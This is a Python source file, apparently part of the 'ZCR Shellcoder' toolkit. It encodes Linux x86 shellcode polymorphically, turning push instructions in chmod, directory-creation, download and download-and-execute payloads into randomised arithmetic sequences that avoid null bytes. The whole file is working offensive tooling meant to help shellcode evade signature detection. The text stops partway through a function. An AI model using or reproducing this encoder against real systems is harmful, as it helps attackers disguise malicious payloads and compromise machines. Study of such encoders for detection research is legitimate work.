#!/usr/bin/env python
'''
ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
'''
import random,binascii,string
chars = string.digits + string.ascii_letters
def start(shellcode,job):
	encodes = ['add_random','sub_random','xor_random','inc_timesyouwant','dec_timesyouwant']
	#much junk codes, need to be clean
	if 'chmod(' in job:	
		selected = random.choice(encodes)
		if selected == 'add_random':
			t = True
			eax = str('0x0f')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) - int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			eax = 'push   $%s'%(str(eax))
			eax_xor = 'push $0x%s\npop %%eax\npush $0x%s\npop %%ebx\nadd %%eax,%%ebx\npush %%ebx\n'%(eax_1,eax_2)
			shellcode = shellcode.replace(eax,eax_xor)
			ecx = str(shellcode.rsplit('\n')[8])
			ecx_value = str(shellcode.rsplit('\n')[8].rsplit()[1][1:])
		if selected == 'sub_random':
			t = True
			eax = str('0x0f')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
				if '00' not in str(eax_1) and '00' not in str(eax_2):
					t = False
			eax = 'push   $0x0f'
			eax_xor = 'push $0x%s\npop %%eax\npush $0x%s\npop %%ebx\nsub %%eax,%%ebx\npush %%ebx\n'%(eax_1,eax_2)
			shellcode = shellcode.replace(eax,eax_xor)
			ecx = str(shellcode.rsplit('\n')[8])
			ecx_value = str(shellcode.rsplit('\n')[8].rsplit()[1][1:])
		if selected == 'xor_random':
			t = True
			eax = str('0x0f')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_2 = "%x" % (int(eax, 16) ^ int(eax_1, 16))
				if '00' not in eax_1 and '00' not in eax_2:
					t = False
			eax = 'push   $%s'%(str(eax))
			eax_xor = 'push $0x%s\npop %%eax\npush $0x%s\npop %%ebx\nxor %%eax,%%ebx\npush %%ebx\n'%(eax_1,eax_2)
			shellcode = shellcode.replace(eax,eax_xor)
			ecx = str(shellcode.rsplit('\n')[8])
			ecx_value = str(shellcode.rsplit('\n')[8].rsplit()[1][1:])
		if selected == 'inc_timesyouwant':
			eax = str('0x0f')
			times = random.randrange(1,50)
			eax_2 = '%x'%(int('0f',16))
			n = 0
			while n<times:
				eax_2 = '%x'%(int(eax_2,16) - int('01',16))
				n+= 1
			eax = 'push   $%s'%(str(eax))
			inc_str = '\ninc %eax' * times
			neg = 0
			if '-' in eax_2:
				eax_2 = eax_2.replace('-','')
				neg = 1
			if neg is 0:
				eax_inc = 'push $0x%s\npop %%eax%s\npush %%eax'%(eax_2,inc_str)
				plus = times - 1
			if neg is 1:
				eax_inc = 'push $0x%s\npop %%eax\nneg %%eax%s\npush %%eax'%(eax_2,inc_str)
				plus = times
			shellcode = shellcode.replace(eax,eax_inc)
			ecx = str(shellcode.rsplit('\n')[5+plus])
			ecx_value = str(shellcode.rsplit('\n')[5+plus].rsplit()[1][1:])
		if selected == 'dec_timesyouwant':
			eax = str('0x0f')
			times = random.randrange(1,50)
			eax_2 = '%x'%(int('0f',16))
			n = 0
			while n<times:
				eax_2 = '%x'%(int(eax_2,16) + int('01',16))
				n+= 1
			eax = 'push   $%s'%(str(eax))
			dec_str = '\ndec %eax' * times
			neg = 0
			if '-' in eax_2:
				eax_2 = eax_2.replace('-','')
				neg = 1
			if neg is 0:
				eax_dec = 'push $0x%s\npop %%eax%s\npush %%eax'%(eax_2,dec_str)
				plus = times - 1
			if neg is 1:
				eax_dec = 'push $0x%s\npop %%eax\nneg %%eax%s\npush %%eax'%(eax_2,dec_str)
				plus = times
			shellcode = shellcode.replace(eax,eax_dec)
			ecx = str(shellcode.rsplit('\n')[5+plus])
			ecx_value = str(shellcode.rsplit('\n')[5+plus].rsplit()[1][1:])
		selected = random.choice(encodes)
		if selected == 'add_random':
			t = True
			while t:
				ecx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
				ecx_2 = "%x" % (int(ecx_value, 16) - int(ecx_1, 16))
				if '00' not in str(ecx_1) and '00' not in str(ecx_2) and len(ecx_1) >= 7 and len(ecx_2) >= 7 and '-' in ecx_2:
					t = False
			ecx_2 = ecx_2.replace('-','')
			ecx_xor = 'push $0x%s\npop %%ebx\npush $0x%s\npop %%ecx\nneg %%ecx\nadd %%ecx,%%ebx\npush %%ebx\n_z3r0d4y_\n'%(str(ecx_1),str(ecx_2))
			shellcode = shellcode.replace(ecx,ecx_xor)
		if selected == 'sub_random':
			t = True
			while t:
				ecx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
				ecx_2 = "%x" % (int(ecx_value, 16) + int(ecx_1, 16))
				if '00' not in str(ecx_1) and '00' not in str(ecx_2) and len(ecx_1) >= 7 and len(ecx_2) >= 7 and '-' not in ecx_2:
					t = False
			ecx_xor = 'push $0x%s\npop %%ebx\npush $0x%s\npop %%ecx\nsub %%ebx,%%ecx\npush %%ecx\n_z3r0d4y_\n'%(str(ecx_1),str(ecx_2))
			shellcode = shellcode.replace(ecx,ecx_xor)
		if selected == 'xor_random':
			t = True
			while t:
				ecx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
				ecx_2 = "%x" % (int(ecx_value, 16) ^ int(ecx_1, 16))
				if '00' not in ecx_1 and '00' not in ecx_2:
					t = False
			ecx_xor = 'push $0x%s\npop %%ebx\npush $0x%s\npop %%ecx\nxor %%ecx,%%ebx\npush %%ebx\n_z3r0d4y_\n'%(str(ecx_1),str(ecx_2))
			shellcode = shellcode.replace(ecx,ecx_xor)
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			ecx_2 = "%x" % (int(ecx_value, 16))
			n = 0
			while n<times:
				ecx_2 = '%x'%(int(ecx_2,16) - int('01',16))
				n+= 1
			neg = 0
			inc_str = '\ninc %ebx' * times
			if '-' in ecx_2:
				ecx_2 = ecx_2.replace('-','')
				neg = 1
			if neg is 0:
				ecx_inc = 'push $0x%s\npop %%ebx%s\npush %%ebx\n_z3r0d4y_\n'%(str(ecx_2),inc_str)
			if neg is 1:
				ecx_inc = 'push $0x%s\npop %%ebx\nneg %%ebx%s\npush %%ebx\n_z3r0d4y_\n'%(str(ecx_2),inc_str)
			shellcode = shellcode.replace(ecx,ecx_inc)
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			ecx_2 = "%x" % (int(ecx_value, 16))
			n = 0
			while n<times:
				ecx_2 = '%x'%(int(ecx_2,16) + int('01',16))
				n+= 1
			neg = 0
			dec_str = '\ndec %ebx' * times
			if '-' in ecx_2:
				ecx_2 = ecx_2.replace('-','')
				neg = 1
			if neg is 0:
				ecx_dec = 'push $0x%s\npop %%ebx%s\npush %%ebx\n_z3r0d4y_\n'%(str(ecx_2),dec_str)
			if neg is 1:
				ecx_dec = 'push $0x%s\npop %%ebx\nneg %%ebx%s\npush %%ebx\n_z3r0d4y_\n'%(str(ecx_2),dec_str)
			shellcode = shellcode.replace(ecx,ecx_dec)
		selected = random.choice(encodes)
		if selected == 'add_random':
			n = 0
			start = ''
			middle = ''
			end = ''
			add = 0
			for l in shellcode.rsplit('\n'):
				n += 1
				if add is 0:
					if '_z3r0d4y_' not in l:
						start += l + '\n'
					else:
						add = 1
				if add is 1:
					if '_z3r0d4y_' not in l:
						if '%esp,%ebx' not in l:
							middle += l + '\n'
						else:
							add = 2
				if add is 2:
					end += l + '\n'
			for l in middle.rsplit('\n'):
				t = True
				while t:
					if 'push $0x' in l:
						ebx = l.rsplit()[1][1:]
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(ebx[2:], 16) - int(ebx_1, 16))
						if '00' not in str(ebx_1) and '00' not in str(ebx_2) and '-' in ebx_2 and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%edx\nneg %%edx\nadd %%ebx,%%edx\npush %%edx\n'%(str(ebx_1),str(ebx_2))
							middle = middle.replace(l,command)
							t = False
					else:
						t = False
			shellcode = start + middle + end
		if selected == 'sub_random':
			n = 0
			start = ''
			middle = ''
			end = ''
			sub = 0
			for l in shellcode.rsplit('\n'):
				n += 1
				if sub is 0:
					if '_z3r0d4y_' not in l:
						start += l + '\n'
					else:
						sub = 1
				if sub is 1:
					if '_z3r0d4y_' not in l:
						if '%esp,%ebx' not in l:
							middle += l + '\n'
						else:
							sub = 2
				if sub is 2:
					end += l + '\n'
			for l in middle.rsplit('\n'):
				t = True
				while t:
					if 'push $0x' in l:
						ebx = l.rsplit()[1][1:]
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(ebx[2:], 16) + int(ebx_1, 16))
						if '00' not in str(ebx_1) and '00' not in str(ebx_2) and '-' not in ebx_2 and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%edx\nsub %%ebx,%%edx\npush %%edx\n'%(str(ebx_1),str(ebx_2))
							middle = middle.replace(l,command)
							t = False
					else:
						t = False
			shellcode = start + middle + end
		if selected == 'xor_random':
			n = 0
			start = ''
			middle = ''
			end = ''
			add = 0
			for l in shellcode.rsplit('\n'):
				n += 1
				if add is 0:
					if '_z3r0d4y_' not in l:
						start += l + '\n'
					else:
						add = 1
				if add is 1:
					if '_z3r0d4y_' not in l:
						if '%esp,%ebx' not in l:
							middle += l + '\n'
						else:
							add = 2
				if add is 2:
					end += l + '\n'
			for l in middle.rsplit('\n'):
				if 'push $0x' in l:
					ebx = l.rsplit()[1][1:]
					ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
					ebx_2 = "%x" % (int(ebx, 16) ^ int(ebx_1, 16))
					command = 'push $0x%s\npop %%ebx\npush $0x%s\npop %%edx\nxor %%ebx,%%edx\npush %%edx'%(str(ebx_1),str(ebx_2))
					middle = middle.replace(l,command)
			shellcode = start + middle + end
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			n = 0
			start = ''
			middle = ''
			end = ''
			add = 0
			for l in shellcode.rsplit('\n'):
				n += 1
				if add is 0:
					if '_z3r0d4y_' not in l:
						start += l + '\n'
					else:
						add = 1
				if add is 1:
					if '_z3r0d4y_' not in l:
						if '%esp,%ebx' not in l:
							middle += l + '\n'
						else:
							add = 2
				if add is 2:
					end += l + '\n'
			for l in middle.rsplit('\n'):
				if 'push $0x' in l:
					ebx = l.rsplit()[1][1:]
					ebx_2 = "%x" % (int(ebx, 16))
					n = 0 
					while n<times:
						ebx_2 = '%x'%(int(ebx_2,16) - int('01',16))
						n+=1
					inc_str = '\ninc %ebx' * times
					neg = 0 
					if '-' in ebx_2:
						ecx_2 = ecx_2.replace('-','')
						neg = 1
					if neg is 0:
						command = 'push $0x%s\npop %%ebx%s\npush %%ebx'%(str(ebx_2),inc_str)
					if neg is 1:
						command = 'push $0x%s\npop %%ebx\nneg %%ebx%s\npush %%ebx'%(str(ebx_2),inc_str)
					middle = middle.replace(l,command)
			shellcode = start + middle + end
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			n = 0
			start = ''
			middle = ''
			end = ''
			add = 0
			for l in shellcode.rsplit('\n'):
				n += 1
				if add is 0:
					if '_z3r0d4y_' not in l:
						start += l + '\n'
					else:
						add = 1
				if add is 1:
					if '_z3r0d4y_' not in l:
						if '%esp,%ebx' not in l:
							middle += l + '\n'
						else:
							add = 2
				if add is 2:
					end += l + '\n'
			for l in middle.rsplit('\n'):
				if 'push $0x' in l:
					ebx = l.rsplit()[1][1:]
					ebx_2 = "%x" % (int(ebx, 16))
					n = 0 
					while n<times:
						ebx_2 = '%x'%(int(ebx_2,16) + int('01',16))
						n+=1
					dec_str = '\ndec %ebx' * times
					neg = 0 
					if '-' in ebx_2:
						ecx_2 = ecx_2.replace('-','')
						neg = 1
					if neg is 0:
						command = 'push $0x%s\npop %%ebx%s\npush %%ebx'%(str(ebx_2),dec_str)
					if neg is 1:
						command = 'push $0x%s\npop %%ebx\nneg %%ebx%s\npush %%ebx'%(str(ebx_2),dec_str)
					middle = middle.replace(l,command)
			shellcode = start + middle + end

	if 'dir_create(' in job:
		selected = random.choice(encodes)
		if selected == 'add_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) - int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_add = 'push $0x%s\npop %%eax\nneg %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')


		if selected == 'sub_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_sub+'\ncltd\n')
		if selected == 'xor_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) ^ int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_xor = 'push $0x%s\npop %%eax\nneg %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_xor = 'push $0x%s\npop %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_xor+'\ncltd\n')
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) - int('01', 16))
				n+= 1
				print n
			inc = 'inc %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,inc)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) + int('01', 16))
				n+= 1
				print n
			dec = 'dec %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,dec)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		encodes = ['add_random','sub_random','xor_random','inc_timesyouwant','dec_timesyouwant']
		selected = random.choice(encodes)
		if selected == 'add_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) - int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and '-' in ebx_2 and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nadd %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'sub_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'xor_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) ^ int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nxor %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) - int('01', 16))
						n+= 1
					inc = 'inc %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(inc))
					shellcode = shellcode.replace(line,command)
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) + int('01', 16))
						n+= 1
					dec = 'dec %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(dec))
					shellcode = shellcode.replace(line,command)
	if 'download_execute(' in job:
		selected = random.choice(encodes)
		if selected == 'add_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) - int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_add = 'push $0x%s\npop %%eax\nneg %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')


		if selected == 'sub_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_sub+'\ncltd\n')
		if selected == 'xor_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) ^ int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_xor = 'push $0x%s\npop %%eax\nneg %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_xor = 'push $0x%s\npop %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_xor+'\ncltd\n')
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) - int('01', 16))
				n+= 1
				print n
			inc = 'inc %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,inc)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) + int('01', 16))
				n+= 1
				print n
			dec = 'dec %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,dec)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		encodes = ['add_random','sub_random','xor_random','inc_timesyouwant','dec_timesyouwant']
		selected = random.choice(encodes)
		if selected == 'add_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) - int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and '-' in ebx_2 and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nadd %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'sub_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'xor_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) ^ int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nxor %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) - int('01', 16))
						n+= 1
					inc = 'inc %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(inc))
					shellcode = shellcode.replace(line,command)
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) + int('01', 16))
						n+= 1
					dec = 'dec %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(dec))
					shellcode = shellcode.replace(line,command)
	if 'download(' in job:
		selected = random.choice(encodes)
		if selected == 'add_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) - int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_add = 'push $0x%s\npop %%eax\nneg %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')


		if selected == 'sub_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
